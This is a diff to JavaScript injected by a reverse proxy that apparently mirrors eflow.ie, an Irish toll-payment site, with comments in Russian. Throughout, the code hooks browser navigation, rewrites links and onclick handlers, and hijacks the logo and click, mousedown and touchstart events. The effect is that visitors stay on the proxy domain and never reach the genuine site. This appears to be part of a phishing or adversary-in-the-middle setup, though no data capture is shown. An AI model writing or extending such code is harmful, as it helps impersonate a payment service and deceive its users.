@@ -1419,6 +1419,47 @@ const proxyOptions = {
   const TARGET_DOMAIN = 'eflow.ie';
   const PROXY_DOMAIN = window.location.hostname;
   
+  // КРИТИЧНО: Перехватываем window.location до любых изменений
+  const originalLocation = window.location;
+  let locationIntercepted = false;
+  
+  function fixUrl(url) {
+    if (!url || typeof url !== 'string') return url;
+    if (url.includes(TARGET_DOMAIN) || url.includes('www.' + TARGET_DOMAIN)) {
+      return url.replace(new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\\\.'), 'gi'), '$1' + PROXY_DOMAIN);
+    }
+    return url;
+  }
+  
+  // Перехватываем присвоение window.location.href
+  try {
+    const locationDescriptor = Object.getOwnPropertyDescriptor(window, 'location');
+    if (locationDescriptor && locationDescriptor.configurable !== false) {
+      // Создаем прокси для location
+      const locationProxy = new Proxy(originalLocation, {
+        set: function(target, prop, value) {
+          if (prop === 'href' && typeof value === 'string') {
+            value = fixUrl(value);
+          }
+          target[prop] = value;
+          return true;
+        }
+      });
+    }
+  } catch(e) {}
+  
+  // Перехватываем window.location.assign и window.location.replace
+  const originalAssign = window.location.assign;
+  const originalReplace = window.location.replace;
+  
+  window.location.assign = function(url) {
+    return originalAssign.call(window.location, fixUrl(url));
+  };
+  
+  window.location.replace = function(url) {
+    return originalReplace.call(window.location, fixUrl(url));
+  };
+  
   // Функция для перехвата и исправления ссылок
   function interceptLink(link) {
     if (!link || !link.href) return;
@@ -1431,23 +1472,73 @@ const proxyOptions = {
         url.hostname = PROXY_DOMAIN;
         url.protocol = window.location.protocol;
         link.href = url.toString();
+        link.setAttribute('data-fixed', 'true');
       }
     } catch (e) {
       // Если не удалось распарсить URL, проверяем строку напрямую
-      if (link.href && (link.href.includes(TARGET_DOMAIN) || link.getAttribute('href')?.includes(TARGET_DOMAIN))) {
-        link.href = link.href.replace(new RegExp(TARGET_DOMAIN, 'gi'), PROXY_DOMAIN);
-        link.href = link.href.replace(/^http:/, window.location.protocol);
+      const hrefAttr = link.getAttribute('href');
+      if (hrefAttr && hrefAttr.includes(TARGET_DOMAIN)) {
+        link.href = hrefAttr.replace(new RegExp(TARGET_DOMAIN, 'gi'), PROXY_DOMAIN);
+        link.setAttribute('data-fixed', 'true');
       }
     }
+    
+    // СПЕЦИАЛЬНО ДЛЯ ЛОГОТИПА: удаляем onclick если он ведёт на eflow.ie
+    const onclick = link.getAttribute('onclick');
+    if (onclick && onclick.includes(TARGET_DOMAIN)) {
+      link.setAttribute('onclick', onclick.replace(new RegExp(TARGET_DOMAIN, 'gi'), PROXY_DOMAIN));
+    }
+  }
+  
+  // Специальная функция для логотипа
+  function fixLogo() {
+    // Ищем логотип по разным селекторам
+    const logoSelectors = [
+      'a.logo', 'a.site-logo', '.logo a', '.site-logo a', 
+      'a[href="/"]', 'header a:first-child', '.header a img',
+      'a img[alt*="logo" i]', 'a img[alt*="eflow" i]',
+      '.branding a', '#logo a', 'a#logo'
+    ];
+    
+    logoSelectors.forEach(selector => {
+      try {
+        const elements = document.querySelectorAll(selector);
+        elements.forEach(el => {
+          const link = el.tagName === 'A' ? el : el.closest('a');
+          if (link) {
+            // Проверяем href
+            const href = link.getAttribute('href');
+            if (href === '/' || href === '' || href === '#' || (href && href.includes(TARGET_DOMAIN))) {
+              // Устанавливаем правильную ссылку на главную прокси
+              link.href = PROXY_ORIGIN + '/';
+              link.setAttribute('data-logo-fixed', 'true');
+              
+              // Удаляем любые onclick обработчики
+              link.removeAttribute('onclick');
+              
+              // Добавляем свой обработчик
+              link.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                window.location.href = PROXY_ORIGIN + '/';
+              }, true);
+            }
+          }
+        });
+      } catch(e) {}
+    });
   }
   
   // Функция для перехвата кликов на ссылки
   function interceptClick(e) {
     const link = e.target.closest('a');
-    if (!link || !link.href) return;
+    if (!link) return;
+    
+    const href = link.href || link.getAttribute('href');
+    if (!href) return;
     
     try {
-      const url = new URL(link.href, window.location.href);
+      const url = new URL(href, window.location.href);
       
       // Если ссылка ведет на eflow.ie - предотвращаем переход и исправляем
       if (url.hostname === TARGET_DOMAIN || url.hostname === 'www.' + TARGET_DOMAIN) {
@@ -1462,14 +1553,14 @@ const proxyOptions = {
         window.location.href = url.toString();
         return false;
       }
-    } catch (e) {
+    } catch (err) {
       // Если не удалось распарсить, проверяем строку
-      if (link.href && link.href.includes(TARGET_DOMAIN)) {
+      if (href && href.includes(TARGET_DOMAIN)) {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
         
-        const fixedHref = link.href.replace(new RegExp(TARGET_DOMAIN, 'gi'), PROXY_DOMAIN).replace(/^http:/, window.location.protocol);
+        const fixedHref = href.replace(new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\\\.'), 'gi'), '$1' + PROXY_DOMAIN);
         window.location.href = fixedHref;
         return false;
       }
@@ -1482,11 +1573,13 @@ const proxyOptions = {
     links.forEach(link => {
       interceptLink(link);
     });
+    fixLogo();
   }
   
   // Перехватывать клики на всех ссылках (включая логотип)
-  document.addEventListener('click', interceptClick, true); // Используем capture phase для раннего перехвата
-  document.addEventListener('mousedown', interceptClick, true); // Также перехватываем mousedown
+  document.addEventListener('click', interceptClick, true);
+  document.addEventListener('mousedown', interceptClick, true);
+  document.addEventListener('touchstart', interceptClick, true); // Для мобильных
   
   // Обработать ссылки при загрузке DOM
   if (document.readyState === 'loading') {
@@ -1497,44 +1590,46 @@ const proxyOptions = {
   
   // Использовать MutationObserver для динамически созданных ссылок
   const observer = new MutationObserver(function(mutations) {
+    let needsProcessing = false;
     mutations.forEach(function(mutation) {
       mutation.addedNodes.forEach(function(node) {
-        if (node.nodeType === 1) { // Element node
-          // Проверить сам узел
-          if (node.tagName === 'A' && node.href) {
-            interceptLink(node);
-          }
-          // Проверить дочерние ссылки
-          const links = node.querySelectorAll && node.querySelectorAll('a[href]');
-          if (links) {
-            links.forEach(interceptLink);
-          }
+        if (node.nodeType === 1) {
+          needsProcessing = true;
         }
       });
     });
+    if (needsProcessing) {
+      processAllLinks();
+    }
   });
   
   // Начать наблюдение
-  if (document.body) {
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true,
-      attributes: true,
-      attributeFilter: ['href']
-    });
-  } else {
-    document.addEventListener('DOMContentLoaded', function() {
+  function startObserver() {
+    if (document.body) {
       observer.observe(document.body, {
         childList: true,
         subtree: true,
         attributes: true,
-        attributeFilter: ['href']
+        attributeFilter: ['href', 'onclick']
       });
-    });
+    }
   }
   
-  // Периодическая проверка (на случай если MutationObserver пропустит что-то)
-  setInterval(processAllLinks, 2000);
+  if (document.body) {
+    startObserver();
+  } else {
+    document.addEventListener('DOMContentLoaded', startObserver);
+  }
+  
+  // Периодическая проверка
+  setInterval(processAllLinks, 1000);
+  
+  // Дополнительная проверка после полной загрузки
+  window.addEventListener('load', function() {
+    setTimeout(processAllLinks, 100);
+    setTimeout(processAllLinks, 500);
+    setTimeout(processAllLinks, 1000);
+  });
   
 })();
 </script>`;
